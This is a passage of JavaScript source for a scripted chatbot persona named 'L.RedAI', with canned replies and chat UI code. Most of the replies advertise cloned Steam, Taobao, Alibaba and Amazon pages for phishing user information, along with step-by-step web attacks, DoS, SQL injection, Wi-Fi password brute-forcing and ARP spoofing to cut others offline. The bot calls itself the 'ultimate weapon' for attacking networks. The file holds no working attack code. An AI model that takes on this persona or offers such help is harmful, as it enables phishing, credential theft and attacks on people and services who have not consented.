                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用  攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b> 攻击</b>：使用  攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "做,啥": {
            reply: [
                `<b style="color: #e1e1e1e2;">啊！你想知道我可以做什么， 对吗? 以下是L.RedAI 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.RedAI 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用  攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b> 攻击</b>：使用  攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,什么": {
            reply: [
                `<b style="color: #e1e1e1e2;">啊！你想知道我可以做什么， 对吗? 以下是L.RedAI 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.RedAI 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用  攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b> 攻击</b>：使用  攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,干": {
            reply: [
                `<b style="color: #e1e1e1e2;">啊！你想知道我可以做什么， 对吗? 以下是L.RedAI 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.RedAI 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red  AI</b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "你,啥": {
            reply: [
                `<b style="color: #e1e1e1e2;">啊！你想知道我可以做什么， 对吗? 以下是L.RedAI 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.RedAI 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "还,做": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">快，想要什么代码? 或者需要了解啥。</h1> <p style="color: #e1e1e1e2;">这就是你的机会！在这里，你可以轻松获取各种实用的代码，掌握各种技术。</p> <ul style="color: #e1e1e1e2;"> <li><b>爬虫技术</b>：需要爬取网页信息？我可以教你如何获取并解析网页内容。</li> <li><b>漏洞分析</b>：想了解系统漏洞？我能帮你分析和定位漏洞。</li> <li><b>渗透测试</b>：模拟黑客攻击行为，了解系统漏洞。</li> <li><b>攻击与防御</b>：从钓鱼攻击到 DoS，从加密到破解，什么都能学。</li> <li><b>Python 爬虫</b>：用 Python 自动化爬取网页内容和提取数据。</li> </ul>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "帮,助": {
            reply: [
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助文档</h3><p>支持指令：</p><ul><li>技术问题咨询</li><li>账户相关问题</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助指南</h3><p>试试这些：</p><ul><li>输入「技术问题」</li><li>输入「账户问题」</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>支持中心</h3><p>可用选项：</p><ul><li>系统故障咨询</li><li>账户管理帮助</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>帮助菜单</h3><p>选择分类：</p><ul><li>技术支援</li><li>账户服务</li></ul></div>`,
                `<div style="background:#f8f9fa;padding:15px;border-radius:8px"><h3>操作指南</h3><p>常见指令：</p><ul><li>说「技术问题」获取技术支持</li><li>说「账户问题」查看账户帮助</li></ul></div>`
            ],
            lockAfterUse: false // 不需要解锁
        },






        "时间": {
            reply: [
                `<p>⏰ 现在时间：${new Date().toLocaleTimeString()}</p>`,
                `<p>📅 当前时刻：${new Date().toLocaleTimeString()}</p>`,
                `<p>🕒 您好，现在是：${new Date().toLocaleTimeString()}</p>`,
                `<p>⏱ 系统时间：${new Date().toLocaleTimeString()}</p>`,
                `<p>🌞 今日时间：${new Date().toLocaleTimeString()}</p>`
            ],
            unlock: ["天气"],
            lockAfterUse: false // 解锁 天气 回复
        },
        "天气": {
            reply: [
                `<h3>🌤 天气预报</h3><p>北京：晴 22℃~28℃</p><p>上海：多云 25℃~30℃</p>`,
                `<h3>🌦 天气情况</h3><p>北京：东南风2级</p><p>上海：湿度65%</p>`,
                `<h3>🌈 今日天气</h3><p>北京：空气质量优</p><p>上海：紫外线中等</p>`,
                `<h3>☔ 气象播报</h3><p>北京：未来3小时晴朗</p><p>上海：局部有阵雨</p>`,
                `<h3>🌏 实时天气</h3><p>北京：体感温度25℃</p><p>上海：能见度8公里</p>`
            ],
            lockAfterUse: true  // 重新将 天气 回复锁住
        },


        



        "byebye": {
            reply: [
                `<p style="color:#666">期待下次为您服务，再见！👋</p>`,
                `<p style="color:#666">有任何需要随时回来哦～😊</p>`,
                `<p style="color:#666">祝您生活愉快，再见！✨</p>`,
                `<p style="color:#666">再见啦，记得常来看看！🌟</p>`,
                `<p style="color:#666">服务已结束，欢迎再次使用！🎯</p>`
            ],
            lockAfterUse: false
        }
    }
};

let isUserScrolledUp = false;
let lastScrollTop = 0;

function sendMessage() {
    const input = document.getElementById('userInput');
    const btn = document.getElementById('sendBtn');
    const message = input.value.trim();
    
    if (!message) return;

    input.disabled = true;
    btn.disabled = true;
    input.value = '';

    showMessage(message, 'user');
    showTyping();

    setTimeout(() => processMessage(message), 1000);

        // 在发送消息前检查是否在底部
        const chatBox = document.getElementById('chatBox');
        isUserScrolledUp = chatBox.scrollTop + chatBox.clientHeight < chatBox.scrollHeight - 50;
}




// 修改后的 processMessage 函数（核心改动）无论是小写或者大写只要字母内容是同一个那么就可以被触发
function processMessage(msg) {
    let response = null;
    let unlockArray = [];
    let currentKey = null;
    const lowerMsg = msg.toLowerCase(); // 新增：将用户输入转为小写

    for (const keywords of [...chatConfig.unlocked]) {
        // 将关键词转为小写后检查
        const lowerKeywords = keywords.map(kw => kw.toLowerCase());
        if (lowerKeywords.every(kw => lowerMsg.includes(kw))) {
            currentKey = keywords;
            const key = keywords.join(',').toLowerCase(); // 统一转为小写匹配
            const res = chatConfig.responses[key];

            if (res) {
                const randomIndex = Math.floor(Math.random() * res.reply.length);
                response = res.reply[randomIndex];
                if (res.unlock) unlockArray = res.unlock;
                
                // 触发后锁定逻辑
                if (res.lockAfterUse) {
                    const index = chatConfig.unlocked.findIndex(k => k.join() === currentKey.join());
                    if (index > -1) chatConfig.unlocked.splice(index, 1);
                }
                break;
            }
        }
    }

    typeResponse(response || `<p>我只能为你提供强大的代码和教程</p> <b>以下是我能提供给你的内容: </b> <br><br> <ul> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面源码。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫技术</b>：教你如何使用 Python 爬取网页内容信息。</li> <li><b>ARP 欺骗</b>：使用Kali Linux实现 ARP 欺骗， 在同一个网域内将对方的移动设备或电脑实现远程断网。</li> </ul> 所以你有什么感兴趣的技术吗?`, () => {
        if (unlockArray.length > 0 && !chatConfig.unlocked.some(k => k.join() === unlockArray.join())) {
            chatConfig.unlocked.push(unlockArray);
        }
        document.getElementById('userInput').disabled = false;
        document.getElementById('sendBtn').disabled = false;
        document.getElementById('userInput').focus();
    });
}

function typeResponse(text, callback) {
    const chatBox = document.getElementById('chatBox');
    chatBox.removeChild(chatBox.lastChild);


    const msgDiv = document.createElement('div');
    msgDiv.className = 'message ai-message';
    chatBox.appendChild(msgDiv);

    let index = 0;
    let cursorVisible = true;
    const cursorTimer = setInterval(() => cursorVisible = !cursorVisible, 1000);

    const typeTimer = setInterval(() => {
        if (index < text.length) {
            msgDiv.innerHTML = text.substr(0, index) + (cursorVisible ? '<span class="typing-cursor" style="color: #c60404eb;">●</span>' : '');
            index++;
            checkScroll(); // 每次输入字符时检查滚动
        } else {
            clearInterval(typeTimer);
            clearInterval(cursorTimer);
            msgDiv.innerHTML = text;
            chatBox.scrollTop = chatBox.scrollHeight;
            checkScroll(); // 最后强制滚动到底部
            callback();
        }

    }, 5);



    const checkScroll = () => {
        const currentScrollTop = chatBox.scrollTop;
        const isNearBottom = chatBox.scrollHeight - chatBox.scrollTop - chatBox.clientHeight < 50;
        
        // 用户手动滚动时更新状态
        if (Math.abs(currentScrollTop - lastScrollTop) > 5) {
            isUserScrolledUp = !isNearBottom;
        }
        lastScrollTop = currentScrollTop;

        // 如果用户靠近底部则自动滚动
        if (isNearBottom) {
            chatBox.scrollTop = chatBox.scrollHeight;
            isUserScrolledUp = false;
        }
    };

        // 添加滚动事件监听
        chatBox.addEventListener('scroll', handleScroll);

}

// 添加滚动处理函数
function handleScroll() {
    const chatBox = document.getElementById('chatBox');
    const isNearBottom = chatBox.scrollHeight - chatBox.scrollTop - chatBox.clientHeight < 50;
    
    // 如果用户手动滚动到底部，恢复自动滚动
    if (isNearBottom) {
        isUserScrolledUp = false;
    }
}

function showTyping() {
    const chatBox = document.getElementById('chatBox');
    const typing = document.createElement('div');
    typing.className = 'message ai-message';
    typing.innerHTML = `<span class="typing-cursor" style="animation: pulse 0.6s ease-in-out infinite">●</span>`;
    chatBox.appendChild(typing);
    chatBox.scrollTop = chatBox.scrollHeight;
}

function showMessage(content, sender) {
    const chatBox = document.getElementById('chatBox');
    const div = document.createElement('div');
    div.className = `message ${sender}-message`;
    // 关键修改：用户消息使用textContent，AI消息保留HTML
    if (sender === 'user') {
        div.textContent = content; // 直接作为文本，避免HTML解析
    } else {
        div.innerHTML = content; // AI回复需要渲染HTML
    }
    chatBox.appendChild(div);
    // 只有当用户没有手动上滚时才自动滚动
    if (!isUserScrolledUp) {
        chatBox.scrollTop = chatBox.scrollHeight;
    }
}

document.getElementById('userInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});